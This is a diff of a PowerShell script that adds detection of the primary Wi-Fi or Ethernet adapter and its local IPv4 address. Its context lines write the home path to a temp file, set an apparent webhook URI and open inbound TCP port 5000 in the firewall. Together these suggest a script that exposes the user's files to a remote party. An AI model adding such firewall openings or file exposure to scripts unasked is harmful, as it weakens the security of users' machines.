@@ -50,6 +50,24 @@ $fpath | Out-File -FilePath "$env:temp/homepath.txt"
 
 $whuri = "$dc"
 
+$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }
+$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -contains 'Wi-Fi' -or  $_.Name -contains 'Ethernet'}
+$primaryInterface = $filteredInterfaces | Select-Object -First 1
+if ($primaryInterface) {
+    if ($primaryInterface.Name -contains 'Wi-Fi') {
+        Write-Output "Wi-Fi is the primary internet connection."
+        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
+    } elseif ($primaryInterface.Name -contains 'Ethernet') {
+        Write-Output "Ethernet is the primary internet connection."
+        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress
+    } else {
+        Write-Output "Unknown primary internet connection."
+    }
+} else {
+    Write-Output "No primary internet connection found."
+}
+
+
 New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow
 $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
 $hpath = Get-Content -Path "$env:temp/homepath.txt"
